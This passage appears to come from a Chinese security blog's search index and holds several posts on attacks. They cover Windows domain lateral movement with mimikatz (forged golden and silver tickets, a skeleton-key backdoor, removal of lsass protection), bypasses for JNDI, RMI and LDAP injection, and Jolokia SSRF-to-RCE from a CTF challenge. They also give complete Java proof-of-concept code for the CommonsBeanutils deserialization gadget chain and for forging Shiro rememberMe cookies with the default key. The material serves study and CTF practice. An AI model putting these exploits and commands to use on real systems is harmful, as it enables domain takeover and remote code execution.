/admin:administrator /domain:ABC.COM /sid:S-1-5-21-3912242732-2617380311-62526969 /krbtgt:c7af5cfc450e645ed4c46daa78fe18da /ticket:test.kiribi kerberos::ptt test.kiribi #导入刚才生成的票据 dir \\\\dc.abc.com\\c$ #导入成功后可获取域管权限   白银票据  利用条件\n1.域名称\n2.域的SID值\n3.域中的Server服务器账户的NTLM-Hash\n4.伪造的用户名，可以是任意用户名.\n5.目标服务器上面需要访问的kerberos服务\n 可以伪造的服务\n   服务名称 同时需要的服务     WMI HOST RPCSS   PowerShell Remoting HOST HTTP   WinRM HOST HTTP   Scheduled Tasks HOST   Windows File Share (CIFS) CIFS   LDAP operations includingMimikatz DCSync LDAP   Windows Remote Server Administration Tools RPCSS LDAP CIFS    服务说明：\n  Silver Ticket连接到具有管理员权限Windows计算机上的WMI 为“ HOST ”服务和“ rpcss ”服务创建白银票据以使用WMI在目标系统上远程执行命令。\n  Silver Ticket连接到以Windows管理员权限计算机上的PowerShell远程执行\n为“ http ”服务和“ wsman ”服务创建Silver Ticket，以获得目标系统上的WinRM和或PowerShell Remoting的管理权限。\n  具有管理员权限的Windows计算机（HOST）的Silver Ticket\n创建银票以获得目标计算机上所涵盖的任何Windows服务的管理员权限。这包括修改和创建计划任务的权限。\n注入两张HTTP＆WSMAN白银票据后，我们可以使用PowerShell远程（或WinRM的）反弹出目标系统shell。首先New-PSSession使用PowerShell创建到远程系统的会话的PowerShell cmdlet，然后Enter-PSSession打开远程shell。\n  Windows共享（CIFS）管理访问的Silver Ticket\n为 “cifs ”服务创建白银票据，以获得目标计算机上任何Windows共享的管理权限。\n注入CIFS Silver Ticket后，我们现在可以访问目标计算机上的任何共享，包括c$共享，我们能够将文件拷贝到共享文件中。\n  Silver Ticket连接到具有管理员权限Windows计算机上的LDAP 为\"ldap\"服务创建Silver Ticket 以获得目标系统（包括Active Directory）上LDAP服务的管理权限。\n利用LDAP Silver Ticket，我们可以远程访问LDAP服务来获得krbtgt的信息\n  步骤(伪造CIFS的白银票据)：\n1.获取hash sid等信息\n1  mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" \u003e 1.txt   2.伪造白银票据\nkerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt\r参数说明：\n/domain：当前域名称\r/sid：SID值，和金票一样取前面一部分\r/target：目标主机，这里是OWA2010SP3.0day.org\r/service：服务名称，这里需要访问共享文件，所以是cifs\r/rc4：目标主机的HASH值\r/user：伪造的用户名\r/ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入\r这时通过klist查看当前会话的kerberos票据可以看到生成的票据。\n使用dir \\\\OWA2010SP3.0day.org\\c$访问DC的共享文件夹。\nskeleton key skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户 都可以使用这个密码进行认证，同时原始密码也可以使用，其原理是对 lsass.exe 进行注 入，所以重启后会失效。\n#在域控上安装 skeleton key\rmimikatz.exe privilege::debug \"misc::skeleton\"\r#在域内其他机器尝试使用 skeleton key 去访问域控，添加的密码是 mimikatz\rnet use \\\\WIN-9P499QKTLDO.adtest.com\\c$ mimikatz /user:adtest\\administrator`\r微软在 2014 年 3 月 12 日添加了 LSA 爆护策略，用来防止对进程 lsass.exe 的代码注入。如果直接尝试添加 skelenton key 会失败。\n#适用系统\rwindows 8.1\rwindows server 2012 及以上` 当然 mimikatz 依旧可以绕过，该功能需要导入mimidrv.sys文件，导入命令如下:\nprivilege::debug\r!+\r!processprotect /process:lsass.exe /remove misc::skeleton`\rNTLM中继 挖坑，待补\n参考 浅探内网横向移动-Pass The Hash\n内网横向移动：利用WMI来渗透\n内网渗透之IPC$入侵\n浅析黄金票据与白银票据\n","description":"","tags":["渗透","内网","域渗透"],"title":"内网横向移动方法","uri":"/posts/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95/"},{"categories":["note"],"content":"本篇原理分析较少，主要是总结梳理攻击，绕过手法\n前置知识 RMI调用流程 RMI基于反序列化，每次数据交换都存在序列化-反序列化操作，由此延伸出对三端的攻击手法\nJNDI攻击手法 通常 JNDI 注入攻击的都是 lookup 方法的执行者，一般步骤如下：\n 目标机器中调用了 InitialContext.lookup(URL)，且 URL 为用户可控 攻击者控制这个 URL 为一个恶意的 RMI 服务地址：rmi://hack:port/name或者ldap://xxx/xxx 恶意 RMI/ldap 服务会返回一个含有恶意 factory 的 Reference 对象或者直接返回恶意序列化数据    JNDI 注入可以通过 RMI 方式和 LDAP 方式来达到攻击效果。 javax.naming.InitialContext.lookup('ldap://127.0.0.1:9999/#Exploit') org.springframework.jndi.JndiLocatorDelegate.lookup('rmi://127.0.0.1:1099/refObj')   jdk8u121 这个版本主要是ban掉了RMI的一些打法\n 从jdk8u121开始，RMI加入了反序列化白名单机制(JEP290) 在jdk8u121之后，对于Reference加载远程代码，jdk的信任机制，在通过rmi加载远程代码的时候，会判断环境变量com.sun.jndi.rmi.object.trustURLCodebase是否为true，而其在121版本及后，默认为false。RMI远程Reference代码攻击方式开始失效  白名单绕过（JEP290绕过） 可以看这篇：RMI-JEP290的分析与绕过 - 安全客，安全资讯平台\n为了绕过JEP290，ysoserial里面的JRMPClient链子，通过UnicastRef这个在RMI反序列化白名单内的gadget进行攻击：\n 用ysoserial启动一个恶意的JRMPListener 受害者启动注册中心(RMI Registry) 攻击者启动Client调用bind()操作 注册中心（受害者）被反序列化攻击   如果我们可以控制 UnicastRef 中 LiveRef 所封装的 host、端口等信息，我们就可以发起一个任意的 JRMP 连接请求，这其实就是 ysoserial 中的 payloads.JRMPClient 的原理。\n实际上ysoserial这个JRMPClient和JRMPListener就是利用JRMP协议对打\n 攻击过程： 后续修复和绕过：\n 绕过的修复版本：jdk8u231，在JDK8u231的dirty函数中多了setObjectInputFilter过程，所以用UnicastRef就没法再进行绕过了。 1.修复版本的绕过：国外安全研究人员@An Trinhs发现了一个gadgets利用链，能够直接反序列化UnicastRemoteObject造成反序列化漏洞。参考：RMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT   在上面的 Bypass 中，UnicastRef 类用了一层包装，通过递归的形式触发反序列化；通过 DGCClient 向 JRMPListener 发起 JRMP 请求，而这条 Gadget 是直接利用一次反序列化发起 JRMP 请求\n 2.绕过的修复版本：jdk8u241，在调用UnicastRef.invoke之前，做了一个检测。声明方法的类，必须要实现Remote接口，然而这里的RMIServerSocketFactory并没有实现，于是无法进入到invoke方法，直接抛出错误。  使用ldap 在这个版本还没有ban掉ldap的Reference对象和ldap直接返回恶意序列化数据\n服务端Object参数暴露 这个其实就是正常RMI Client攻击Server的手法。\n例如，远程调用的接口 RemoteInterface 存在一个 sayGoodbye 方法的参数是 Object 类型。\nRMI的传输100%基于反序列化，那我们就直接可以传一个反序列化 payload 进去执行反序列化。\n如果参数不是Object还有后续绕过：\n 由于攻击者可以完全控制客户端，因此他可以用恶意对象替换从Object类派生的参数（例如String）有几种方法：\n  将java.rmi软件包的代码复制到新软件包，然后在其中更改代码\n  将调试器附加到正在运行的客户端，并在序列化对象之前替换对象\n  使用Javassist之类的工具更改字节码\n  通过实现代理来替换网络流上已经序列化的对象\n   也被su18师傅称为替身攻击：\n 大体的思路就是调用的方法参数是 HelloObject，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。\n afanti师傅用的是通过RASP hook住java.rmi.server.RemoteObjectInvocationHandler类的InvokeRemoteMethod方法的第三个参数非Object的改为Object的gadget。他的项目地址在RemoteObjectInvocationHandler。\njdk8u191 这个版本ban掉了ldap的Reference对象\n 在jdk8u191之后，加入LDAP远程Reference代码信任机制，LDAP远程代码攻击方式开始失效，也就是系统变量com.sun.jndi.ldap.object.trustURLCodebase默认为false（CVE-2018-3149）\n 高版本绕过主要有两种方式：\n  LDAP Server 直接返回恶意序列化数据，但需要目标环境存在 Gadget 依赖\n  使用本地 Factory 绕过（主要是利用了 org.apache.naming.facotry.BeanFactory 类）\n  ldap直接返回序列化数据  搭建恶意LDAP Server，可以直接改 marshalsec 里面的： 受害者 lookup 方法参数可控，执行 ldap://xxx/xxx  利用本地 Factory 绕过 在 Reference 类中的 factory Class，要求实现 ObjectFactory 接口，在 \"NamingManager#getObjectFactoryFromReference\" 方法中的逻辑是这样的：\n 优先从本地加载 factory，这就要求 factory Class 在本地的 ClassPath 中 本地加载不到会从 codebase 处加载，但是由于高版本 jdk 默认不信任 codebase，在一般情况下无法利用 在加载完 factory 之后会强制类型转换为 javax.naming.spi.ObjectFactory 接口类型，之后调用 factory.getObjectInstance() 方法  所以如果找可以利用的 factory 就要满足下面的要求：\n  在目标的 ClassPath 中，且实现了 javax.naming.spi.ObjectFactory 接口\n  其 getObjectInstance 方法可以被利用\n  （其中一条Gadget）这个可用的 factory 类为 org.apache.naming.BeanFactory，位于 tomcat 的依赖包中，此外，这个 factory 绕过需要搭配 javax.el.ELProcessor 执行任意的 EL 表达式来完成 RCE，依赖：\n1 2 3 4 5 6 7 8 9 10 11 12  \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat\u003c/groupId\u003e \u003cartifactId\u003etomcat-catalina\u003c/artifactId\u003e \u003cversion\u003e8.5.0\u003c/version\u003e \u003c/dependency\u003e \u003c!-- 加载ELProcessor时需要 --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.tomcat.embed\u003c/groupId\u003e \u003cartifactId\u003etomcat-embed-el\u003c/artifactId\u003e \u003cversion\u003e8.5.0\u003c/version\u003e \u003c/dependency\u003e   Reference 如何绕过高版本 JDK 的限制进行 JNDI 注入利用 - 安全客\nRMI Bypass Jep290(Jdk8u231) 反序列化漏洞分析 - 360CERT\nRMI-JEP290的分析与绕过 - 安全客，安全资讯平台\nBypass JEP290 - Y4er\n如何绕过高版本JDK的限制进行JNDI注入利用\n浅析高低版JDK下的JNDI注入及绕过 [Mi1k7ea]\nJNDI注入分析 - 跳跳糖\n","description":"","tags":["JNDI","RMI","LDAP"],"title":"JNDI、RMI、LDAP防御和绕过总结","uri":"/posts/jndirmildap%E9%98%B2%E5%BE%A1%E5%92%8C%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"},{"categories":["note"],"content":"之前看到一个Jolokia新的利用姿势：\nSSRF to RCE with Jolokia and MBeans\n这篇文章介绍了在SSRF只能GET请求的场景下，Jolokia一些读写文件，加载.so文件的利用方法\n我参考这篇文章，结合了之前APISandbox的一些打法出在了 NCTF 2021 上面\n Java管理扩展（JavaManagementExtensions，JMX）是一种Java技术，它提供用于管理和监视应用程序、系统对象、设备（如打印机）和面向服务的网络的工具，这些资源由被称为MBean（Managed Bean）的对象表示。在JMX API中，可以动态加载和实例化类。可以使用Java动态管理工具包设计和开发管理和监视应用程序。\nJolokia是一个JMX-HTTP桥接器，它可以利用JSON通过HTTP实现JMX远程管理，具有快速、简单等特点。除了支持基本的JMX操作之外，它还提供一些独特的特性来增强JMX远程管理如：批量请求，细粒度安全策略等。\n我们通过阅读官方文档可以知道，Jolokia URL模式大概是：/jolokia/action/package:MBeanSelector/method/param1/param2这个样子，使用/的时候需要用!转义\n文章中提到了几种（GET请求触发）手法，分别是：\n 使用vmSystemProperties获取JVM信息 使用JavaFlightRecorder任意文件写 使用compilerDirectivesAdd任意文件读 使用jvmtiAgentLoad任意加载 .so 使用vmLog写入日志文件  作者通过vmlog往Tomcat ROOT路径写jsp webshell来实现从SSRF到RCE的转变。\n当时正在构思NCTF校赛出什么题目，看到这几种利用手法，就想着结合之前APISandbox的一些东西，出一道actuator的综合利用，题目设计大概是这样的：\n一个正常的Springboot应用，/actuator配置里面暴露了一些本来不应该暴露的端点，其中就有jolokia，env等\n直接访问/actuator/jolokia/会403，是因为我使用SpringSecurity限制了本地IP访问\n用APIKit扫描，或者访问/actuator/mappings可以看到有一个隐藏的API/user/list：\n这个API返回XML数据，可以自然想到XXE。\n为了不让XXE直接读文件，我加了waf过滤了除http协议之外的协议，预期是利用XXE来SSRF打/actuator/jolokia/。\n这儿有俩坑点，docker端口是开在58082的，SSRF的时候请求端口需要访问/actuator/env来获得，是8080\n构造SSRF之后，访问/actuator/jolokia/list会发现报错：\n这是因为/jolokia/list返回的数据太长了，而且里面有一些特殊符号会报XML document structures must start and end within the same entity.。\n于是后面给了附件pom.xml，可以本地起起来看一下有什么Mbean。\n然后可以判断远程环境是否存在这个Mbean：\n如果不存在返回的是上图，如果存在返回的是下图两种情况\n那么便可以直接用com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/flag来读取flag了。\n","description":"","tags":["Java","Jolokia"],"title":"Jolokia读写文件新姿势","uri":"/posts/jolokia%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E6%96%B0%E5%A7%BF%E5%8A%BF/"},{"categories":["note"],"content":"前置知识 学习CommonsBeanutils之前应该知道\n javaBean，可以看《Java简单特性》也可以看这里 有关BeanComparator的介绍 TemplatesImpl gadget，前两个方法是public  TemplatesImpl#getOutputProperties() -\u003e TemplatesImpl#newTransformer() -\u003e TemplatesImpl#getTransletInstance() -\u003e TemplatesImpl#defineTransletClasses()\r-\u003e TransletClassLoader#defineClass()\rcbu链原理 BeanComparator()用于比较两个Java Bean，当property不存在的时候会调用PropertyUtils.getProperty去获取JavaBean的属性，也就是执行getter\n恰巧TemplatesImpl#getOutputProperties符合getter的命名规则\nGadget Gadget chain:\rObjectInputStream.readObject()\rPriorityQueue.readObject()\rPriorityQueue.heapify()\rPriorityQueue.siftDown()\rsiftDownUsingComparator()\rBeanComparator.compare()\rTemplatesImpl.getOutputProperties()\rTemplatesImpl.newTransformer()\rTemplatesImpl.getTransletInstance()\rTemplatesImpl.defineTransletClasses()\rTemplatesImpl.TransletClassLoader.defineClass()\rRuntime.exec()\rPoc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; public class CommonsBeanutils1 { public static void main(String[] args) throws Exception { String base64encodedString = Base64.getEncoder().encodeToString(getpayload()); System.out.println(base64encodedString); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[] getpayload() throws Exception { byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); // stub data for replacement later  queue.add(1); queue.add(1); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); //本地触发测试  System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); return barr.toByteArray(); } }   Shiro反序列化遇到的困难  本地生成payload的包和远程依赖的包版本不一导致serialVersionID不一致，反序列化失败   Shiro自带CommonsBeanutils，不依赖cc。但是Shiro反序列化需要cc 虽然cbu本身依赖cc，但是Shiro中自带的cbu中的类不全，反序列化会失败  no CC的Gadge org.apache.commons.collections.comparators.ComparableComparator在BeanComparator类的构造方法里面被用到，要解决没有cc的时候ClassNotFound的问题就需要替换这个ComparableComparator。\n因为ComparableComparator实现了Comparator接口，替换候选类需要满足：\n 实现了java.util.Comparator，java.io.Serializable接口 Java，shiro，cbu里面自带  我们去看Comparator接口，看下哪些类实现了他：\njava.lang.String.CaseInsensitiveComparator：\n直接通过String.CASE_INSENSITIVE_ORDER就可以获得一个对象\npoc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void main(String[] args) throws Exception { String base64encodedString = Base64.getEncoder().encodeToString(getpayload()); System.out.println(base64encodedString); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static byte[] getpayload() throws Exception { byte[] code = Base64.getDecoder().decode(\"yv66vgAAADQANQoACwAaCQAbABwIAB0KAB4AHwoAIAAhCAAiCgAgACMHACQKAAgAJQcAJgcAJwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAoAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEADVN0YWNrTWFwVGFibGUHACYHACQBAApTb3VyY2VGaWxlAQAXSGVsbG9UZW1wbGF0ZXNJbXBsLmphdmEMABMAFAcAKQwAKgArAQATSGVsbG8gVGVtcGxhdGVzSW1wbAcALAwALQAuBwAvDAAwADEBAAhjYWxjLmV4ZQwAMgAzAQATamF2YS9pby9JT0V4Y2VwdGlvbgwANAAUAQASSGVsbG9UZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAKAAsAAAAAAAMAAQAMAA0AAgAOAAAAGQAAAAMAAAABsQAAAAEADwAAAAYAAQAAAAsAEAAAAAQAAQARAAEADAASAAIADgAAABkAAAAEAAAAAbEAAAABAA8AAAAGAAEAAAAMABAAAAAEAAEAEQABABMAFAABAA4AAABsAAIAAgAAAB4qtwABsgACEgO2AAS4AAUSBrYAB1enAAhMK7YACbEAAQAMABUAGAAIAAIADwAAAB4ABwAAAA8ABAAQAAwAEgAVABUAGAATABkAFAAdABYAFQAAABAAAv8AGAABBwAWAAEHABcEAAEAGAAAAAIAGQ==\"); TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{code}); setFieldValue(obj, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); // stub data for replacement later  queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, obj}); // 生成序列化字符串  ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); // //本地触发测试 // System.out.println(barr); // ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); // Object o = (Object)ois.readObject();  return barr.toByteArray(); } }   ","description":"","tags":["Shiro","Java","反序列化"],"title":"Shiro反序列化的终点cbu和no Cc利用链","uri":"/posts/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E7%BB%88%E7%82%B9cbu%E5%92%8Cno-cc%E5%88%A9%E7%94%A8%E9%93%BE/"},{"categories":["note"],"content":"攻击shiro思路 伪造加密过程 shiro在容器初始化的时候会实例化CookieRememberMeManager对象，并且设置加密解密方式\n实例化时调用父类构造方法，设置加密方式为AES，并且设置key\n看下调用 栈\n1 2 3 4 5 6  \u003cinit\u003e:109, AbstractRememberMeManager (org.apache.shiro.mgt) \u003cinit\u003e:87, CookieRememberMeManager (org.apache.shiro.web.mgt) \u003cinit\u003e:75, DefaultWebSecurityManager (org.apache.shiro.web.mgt) createDefaultInstance:65, WebIniSecurityManagerFactory (org.apache.shiro.web.config) …… run:748, Thread (java.lang)   然后在之前也说过，加密的时候先序列化再用encrypt()方法加密\n所以我们构造poc伪造加密的时候，直接这样就行了：\n1 2 3 4 5 6 7 8 9 10 11 12 13  import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class poc { public static void main(String []args) throws Exception { byte[] payloads = \u003c构造好的序列化流\u003e AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } }   探测shiro key https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ\n 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.subject.SimplePrincipalCollection; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.util.Base64; public class shirokey { public static void main(String []args) throws Exception { SimplePrincipalCollection pal = new SimplePrincipalCollection(); ByteArrayOutputStream brr = new ByteArrayOutputStream(); ObjectOutputStream obj = new ObjectOutputStream(brr); obj.writeObject(pal); byte[] payloads = brr.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); //byte[] key = Base64.getDecoder().decode(\"acH+bIxk5D2deZiIxcaaaA==\");  ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); //自动Base64  } }   key正确时：\nkey错误时：\n基于此枚举key\n使用CC链打shiro 直接拿cc3开梭：\nShiroPoc.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.util.Base64; public class ShiroPoc { public static void main(String []args) throws Exception { byte[] payloads = cc3.getpayload(); //byte[] payloads = CommonsCollectionShiro.getpayload();  AesCipherService aes = new AesCipherService(); byte[] key = Base64.getDecoder().decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.println(ciphertext.toString()); //自动Base64  } }   cc3.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72  import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InstantiateTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; import java.util.Map; public class cc3 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { String base64encodedString = Base64.getEncoder().encodeToString(getpayload()); System.out.println(base64encodedString); } public static byte[] getpayload() throws Exception { byte[] code = 